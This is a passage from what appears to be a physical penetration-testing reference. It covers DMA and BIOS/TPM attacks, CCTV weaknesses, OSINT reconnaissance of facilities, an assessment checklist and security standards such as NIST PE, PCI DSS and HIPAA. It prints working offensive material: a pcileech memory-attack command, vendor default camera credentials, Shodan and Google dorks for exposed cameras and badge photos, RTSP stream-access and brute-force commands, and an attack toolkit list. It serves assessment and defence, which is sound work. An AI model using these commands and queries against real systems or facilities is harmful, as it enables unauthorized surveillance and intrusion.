  pcileech.exe wx64_pscmd -device FPGA
  ```

**Defenses**:
- **Kernel DMA Protection** (Windows 10 1803+): blocks DMA before OS boots; requires IOMMU
- **Thunderbolt Security Level**: set to "User" or "Secure Connect" in BIOS/UEFI
- **IOMMU**: Enable VT-d (Intel) or AMD-Vi in BIOS; prevents unauthorized DMA
- **No Thunderbolt in high-security environments**: disable Thunderbolt entirely in BIOS

#### BIOS / UEFI Attacks
**Threats**:
- Boot from USB: bypass OS authentication, mount drives, extract data
- BIOS settings modification: disable Secure Boot, enable legacy boot, disable TPM
- BIOS implants: persistent firmware-level malware (e.g., CosmicStrand, MoonBounce APT implants)
- BIOS password extraction via CMOS reset (battery removal or jumper)

**Defenses**:
- Strong BIOS password (alphanumeric, not "password1")
- Secure Boot enabled with custom Platform Key (PK) for high-security environments
- Full disk encryption with TPM + PIN (prevents cold boot of drive)
- Tamper-evident case seals
- BIOS integrity monitoring (Intel Boot Guard, AMD Platform Secure Boot)

#### TPM Bypass Techniques
- **TPM sniffing**: LPC/SPI bus sniffing with logic analyzer captures PCR values and keys
- **Bitpixie attack** (CVE-2023-21563): PXE boot attack against BitLocker on TPM-only (no PIN) systems
- **Defense**: TPM + PIN (network unlock exempt) eliminates most practical TPM bypass attacks

---

## 9. CCTV and Surveillance Systems

### CCTV Vulnerability Assessment

#### Default Credentials
Most IP cameras ship with default credentials that are rarely changed:

| Vendor | Common Default Credentials |
|---|---|
| Hikvision | admin / 12345 |
| Dahua | admin / admin |
| Axis | root / pass |
| Bosch | service / (blank) |
| Vivotek | root / (blank) |
| Reolink | admin / (blank) |

**Finding exposed cameras on Shodan**:
```
# Hikvision cameras with screenshots
product:"HIKVISION" has_screenshot:true

# Dahua DVR login pages
http.title:"DVR Login"

# Generic RTSP
port:554 has_screenshot:true

# Axis cameras
http.favicon.hash:999357577

# Generic video feed exposure
http.html:"LiveView" http.html:"camera"
```

#### Unencrypted RTSP Streams
Many cameras expose unauthenticated RTSP video streams:

```bash
# Connect to RTSP stream (VLC or ffplay)
vlc rtsp://camera-ip:554/live
ffplay rtsp://camera-ip:554/live/ch0

# Common RTSP path formats
rtsp://camera-ip:554/h264/ch1/main/av_stream  # Hikvision
rtsp://camera-ip:554/cam/realmonitor?channel=1&subtype=0  # Dahua
rtsp://camera-ip:554/axis-media/media.amp  # Axis

# Scan for RTSP with nmap
nmap -p 554 --script rtsp-url-brute target-ip
```

#### DVR/NVR Vulnerabilities
- Many DVR/NVR units run embedded Linux with years-old kernels
- Hikvision backdoor (CVE-2021-36260): unauthenticated RCE via HTTP
- Dahua backdoor: authentication bypass CVE-2021-33044
- NUUO NVR: multiple CVEs including CVE-2018-1149 (stack overflow)
- **Shodan regularly shows 100,000+ exposed DVR/NVR units**

#### Physical Camera Tampering
- **Spray paint / tape**: cheap, effective; must be reversed by physical access
- **Infrared LED array**: floods camera IR sensor; effective at night (camera goes white)
- **Laser pointer**: can permanently damage CCD sensor; creates legal risk for attacker
- **Physical misdirection**: turn camera to face wall or ceiling

### Surveillance Defense Best Practices

1. **Credentials**: Change all defaults; use unique strong passwords per device
2. **Network segmentation**: VLAN cameras off from production network; no internet access without firewall
3. **Firmware updates**: Apply patches — many critical CVEs exist in unpatched camera firmware
4. **Encrypted streams**: Use HTTPS for management, SRTP for video streams where supported
5. **Physical protection**: Vandal-resistant housings (IK10 rated), tamper detection alerts
6. **Placement**: Cameras should be placed to avoid blind spots; overlap coverage
7. **Retention**: Minimum 30 days for standard areas; 90+ days for high-security areas
8. **Monitoring**: Recorded-only surveillance misses real-time events; consider live monitoring or VMS analytics

---

## 10. OSINT for Physical Reconnaissance

### Facility Reconnaissance Sources

| Source | What to Look For | Tools |
|---|---|---|
| Google Maps Satellite | Facility layout, parking, loading dock, roof access | Google Earth Pro for historical imagery |
| Google Street View | Entry points, lock types, badge reader models, camera positions | Street View + Mapillary |
| LinkedIn | Employee names, roles (security staff, facilities), badge photos in profile pictures | LinkedIn Sales Navigator, Maltego |
| Job postings | Security technology ("Lenel OnGuard", "Genetec", "Brivo") | LinkedIn Jobs, Indeed, Glassdoor |
| Building permits | Architectural drawings, security system permits | County/municipal records (often online) |
| Company website | Office locations, hours of operation, visitor policy, team directory | Manual review + OSINT tools |
| Social media | Interior photos, badge designs, security checkpoint layouts | Instagram geotag, Twitter/X image search |
| EDGAR / SEC filings | Facility addresses, data center locations for public companies | SEC.gov EDGAR |
| Glassdoor reviews | Security culture hints ("very strict badge check", "anyone can walk in") | Glassdoor.com |
| Google Dorks | Exposed documents, camera feeds, facility schematics | Google with site: and filetype: operators |

### Badge Intelligence from Social Media

Photos posted to social media often reveal:
- Badge design (color, layout, logo placement) — sufficient for a convincing fake
- Access level indicators (color-coded zones visible on badge)
- Lanyard design (some companies use specific branded lanyards)
- Facility interior — security desk placement, turnstile type, camera positions
- Employee faces — useful for building a convincing identity

**Search methodology**:
```
LinkedIn: Search company name → Employees → Filter by department → View profiles with photos
Instagram: Search company geotag or hashtag
Twitter/X: site:twitter.com [company name] badge OR "office"
Facebook: company page photos, employee check-ins
```

### Technical OSINT

**Job postings as security intelligence**:
```
"Experience with Lenel OnGuard required" → Physical access system: Lenel OnGuard
"Manage HID door controllers" → Access card system: HID
"Monitor Genetec Security Center" → VMS: Genetec
"Configure Milestone XProtect" → VMS: Milestone
"Maintain Bosch intrusion system" → Alarm: Bosch
```

This tells you exactly which physical security systems to research for vulnerabilities before the engagement.

**Google Dorks for physical security intelligence**:
```
# Exposed NVR login pages
intitle:"Network Video Recorder" inurl:login

# Facility security procedures
site:target.com filetype:pdf "visitor" OR "badge" OR "access control"

# Emergency evacuation plans (often posted publicly)
site:target.com "evacuation" OR "floor plan"

# Employee badge photos
site:linkedin.com "target company" badge
```

---

## 11. Physical Security Controls Assessment Checklist

Use this checklist during a physical security assessment. For each control, mark:
`[P]` = Present and adequate | `[I]` = Inadequate | `[A]` = Absent | `[NA]` = Not applicable

```
PERIMETER SECURITY
[ ] Perimeter fencing or walls continuous with no gaps
[ ] Vehicle barriers (bollards/crash-rated) at primary entrance
[ ] Lighting adequate at all perimeter points (no dark areas >10 ft)
[ ] Visitor parking separated from staff/secured parking
[ ] Perimeter CCTV with no blind spots
[ ] Landscaping does not create concealment opportunities for attackers

BUILDING ENTRY
[ ] Receptionist or security guard desk at primary entrance
[ ] Visitor registration: ID check, sign-in log, badge issued
[ ] Visitor escort policy: no unescorted visitors beyond reception
[ ] Badge access control on all entry points (not just main entry)
[ ] Mantrap/airlock on high-security entry points
[ ] Anti-tailgating turnstiles or monitored badge readers
[ ] After-hours access restrictions and logging
[ ] Door hardware: solid core, concealed hinges, deadbolt or electronic lock

INTERIOR ACCESS
[ ] Server room/data center: badge-only access, no shared key
[ ] Server room: CCTV with minimum 90-day retention
[ ] Individual rack/cabinet locks in server room
[ ] Network closets/IDF/MDF: locked, access controlled
[ ] Communications rooms: no public-area exposure
[ ] Clean desk policy: no sensitive documents left on desks
[ ] Whiteboard policy: no sensitive information left on whiteboards
[ ] No dangling network cables accessible in public areas
[ ] Conference room network jacks deactivated when not in use

SURVEILLANCE
[ ] CCTV covering all entry/exit points with no gaps
[ ] CCTV in parking areas (especially for after-hours risk)
[ ] Video retention policy documented (minimum 30 days, 90+ recommended)
[ ] CCTV monitored (live monitoring vs recorded-only)
[ ] Camera tamper detection/alerting
[ ] Camera default credentials changed

MEDIA AND DEVICE SECURITY
[ ] Cross-cut (minimum) paper shredder in use; micro-cut preferred
[ ] Secure media destruction program (NIST 800-88 compliant)
[ ] USB port restrictions at workstations (endpoint DLP)
[ ] Visitor device policy (no personal devices in sensitive areas)
[ ] Laptop/device cable locks in unattended public areas
[ ] Printer/copier hard drive security (encryption or destruction on decommission)

PERSONNEL SECURITY
[ ] Background checks performed for roles with sensitive access
[ ] Badge/key return procedure on employee termination (same day)
[ ] Visitor escort policy enforced (not just documented)
[ ] Security awareness training includes physical security module
[ ] Reported tailgating incidents tracked and acted upon
[ ] Emergency contacts for out-of-hours security incidents

ENVIRONMENTAL CONTROLS
[ ] UPS on critical systems with tested runtime
[ ] Generator tested quarterly under load
[ ] Fire suppression appropriate for electronics (clean agent, not water)
[ ] VESDA or early smoke detection in server room
[ ] Temperature/humidity monitored with alerts
[ ] Water/flood detection sensors under raised floor
[ ] Access to environmental controls (HVAC, power panels) restricted
```

---

## 12. Physical Security Standards & Frameworks

### NIST SP 800-53 Rev 5 — PE Controls (Physical and Environmental Protection)

| Control | Name | Key Requirement |
|---|---|---|
| PE-1 | Policy and Procedures | Formal physical security policy |
| PE-2 | Physical Access Authorizations | Maintain authorized personnel list; review quarterly |
| PE-3 | Physical Access Control | Enforce authorizations at entry/exit; control visitor access |
| PE-4 | Access Control for Transmission | Protect network access points physically |
| PE-5 | Access Control for Output Devices | Control physical access to printers, fax, copiers |
| PE-6 | Monitoring Physical Access | Monitor physical access with cameras/guards; review incidents |
| PE-7 | Visitor Control | **Withdrawn in Rev 5** (merged into PE-3) |
| PE-8 | Visitor Access Records | Maintain visitor log 2+ years |
| PE-9 | Power Equipment and Cabling | Protect power feeds, UPS, emergency shutoffs |
| PE-10 | Emergency Shutoff | Emergency power shutoff per room, protection from accidental use |
| PE-11 | Emergency Power | UPS short-term + generator long-term |
| PE-12 | Emergency Lighting | Automatic emergency lighting |
| PE-13 | Fire Protection | Fire suppression; detection system automatic/manual |
| PE-14 | Environmental Controls | Maintain temperature/humidity within accepted range |
| PE-15 | Water Damage Protection | Shutoff valves accessible and known; leak detection |
| PE-16 | Delivery and Removal | Control items entering/exiting facility; authorization required |
| PE-17 | Alternate Work Site | Physical security controls at alternate/home office sites |
| PE-18 | Location of System Components | Consider flood, fire, explosion risk in system placement |
| PE-19 | Information Leakage | Protect against electromagnetic signal compromise (TEMPEST) |
| PE-20 | Asset Monitoring and Tracking | Track hardware assets entering/leaving |
| PE-21 | Electromagnetic Pulse Protection | Protect critical assets against EMP |
| PE-22 | Component Marking | Mark information system components per classification |
| PE-23 | Facility Location | Threat and risk analysis for facility location |

### ISO 27001:2022 Annex A.7 — Physical Controls

| Control | Description |
|---|---|
| A.7.1 | Physical security perimeters |
| A.7.2 | Physical entry |
| A.7.3 | Securing offices, rooms and facilities |
| A.7.4 | Physical security monitoring |
| A.7.5 | Protecting against physical and environmental threats |
| A.7.6 | Working in secure areas |
| A.7.7 | Clear desk and clear screen |
| A.7.8 | Equipment siting and protection |
| A.7.9 | Security of assets off-premises |
| A.7.10 | Storage media |
| A.7.11 | Supporting utilities |
| A.7.12 | Cabling security |
| A.7.13 | Equipment maintenance |
| A.7.14 | Secure disposal or re-use of equipment |

### PCI DSS v4.0 Requirement 9 — Restrict Physical Access

**Requirement 9.1**: Processes and mechanisms for restricting physical access to cardholder data are defined and understood.

**Requirement 9.2**: Physical access controls manage entry into facilities and systems containing cardholder data:
- 9.2.1: Appropriate facility entry controls
- 9.2.2: Individual physical access authorization reviewed at least every 90 days

**Requirement 9.3**: Physical access for personnel and visitors is authorized and managed:
- 9.3.1: Procedures for authorizing and managing physical access for all personnel
- 9.3.2: Visitor authorization and management (sign in, badge issued, escorted, badge returned)
- 9.3.3: Visitor logs retained for minimum 3 months

**Requirement 9.4**: Media with cardholder data is securely stored, accessed, distributed, and destroyed.

**Requirement 9.5**: Point of interaction (POI) devices are protected from tampering and substitution:
- 9.5.1: POI device surface inspection for tampering
- 9.5.1.1: Periodic inspections of POI devices for unauthorized changes
- 9.5.1.2: Training for personnel to be aware of POI tampering and skimming

### HIPAA Physical Safeguards (45 CFR § 164.310)

| Standard | Specification | Required/Addressable |
|---|---|---|
| Facility Access Controls | Contingency operations | Addressable |
| Facility Access Controls | Facility security plan | Addressable |
| Facility Access Controls | Access control and validation procedures | Addressable |
| Facility Access Controls | Maintenance records | Addressable |
| Workstation Use | Policy on proper use of workstations with ePHI | Required |
| Workstation Security | Physical safeguards for workstations with ePHI | Required |
| Device and Media Controls | Disposal of hardware/media with ePHI | Required |
| Device and Media Controls | Media re-use (data sanitization before reuse) | Required |
| Device and Media Controls | Accountability (tracking hardware/media movement) | Addressable |
| Device and Media Controls | Data backup and storage | Addressable |

### Additional Standards

**NERC CIP-006** (Critical Infrastructure Protection — Physical Security of BES Cyber Systems):
- Applicable to electric utilities
- Requires Physical Security Plan, Physical Security Perimeter (PSP) definition
- 6-year retention of physical access logs
- Mandatory visitor escort, control of inbound/outbound cabling

**ASIS International Physical Security Professional (PSP)**:
- Certification covering: Threat Assessment and Risk Analysis, Physical Security Assessment, Application of Physical Security Measures
- Body of knowledge includes: security surveys, crime prevention through environmental design (CPTED), access control systems, intrusion detection, video surveillance

**CPTED (Crime Prevention Through Environmental Design)**:
- **Natural surveillance**: design buildings and spaces to increase visibility (openness, lighting)
- **Natural access control**: guide people through spaces with landscaping, walkways, fencing
- **Territorial reinforcement**: design that clearly delineates public vs private space
- **Maintenance**: well-maintained environments reduce criminal opportunity (broken windows theory)
- Key standard: IQ Standard 1.0 (CPTED principles)

---

## Quick Reference: Physical Pentesting Toolkit

| Category | Tool | Purpose |
|---|---|---|
| Lock picking | Sparrows Reload Kit | Pin tumbler picking, raking |
| Lock picking | Peterson picks | High-quality individual picks |
| Lock bypass | Under-door tool set | Handle grab under door gap |
| Lock bypass | Air wedge set | Create door gap, access release |
| RFID | Proxmark3 RDV4 | Full-spectrum RFID research, clone, emulate |
| RFID | Flipper Zero | Portable read/emulate 125kHz + NFC |
| RFID blanks | T5577 cards | Write LF clones to these |
| RFID blanks | Gen2 MIFARE cards | Write HF MIFARE clones |
| Wireless | Hak5 WiFi Pineapple | Rogue AP, MITM, credential capture |
| Network implant | LAN Turtle | Reverse shell from network jack |
| Network implant | Shark Jack | Auto-execute payload on plug-in |
| USB attack | USB Rubber Ducky | HID keyboard injection |
| USB attack | Bash Bunny | Multi-mode USB attack platform |
| Sub-GHz | Flipper Zero | Fixed code capture and replay |
| Surveillance | Laptop camera + VLC | RTSP stream verification |
| Documentation | Body camera | Covert evidence documentation |
| Props | ID card printer (Zebra ZC300) | Fake badge creation |
| OSINT | Maltego | Graphical link analysis for recon |
| OSINT | Shodan | Find exposed cameras, NVRs |

---

*Last updated: 2026-04-24*
*Category: Physical Security | Tags: physical pentest, lock picking, RFID, badge cloning, Proxmark3, Flipper Zero, social engineering, surveillance, NIST PE controls, PCI DSS, physical security assessment*
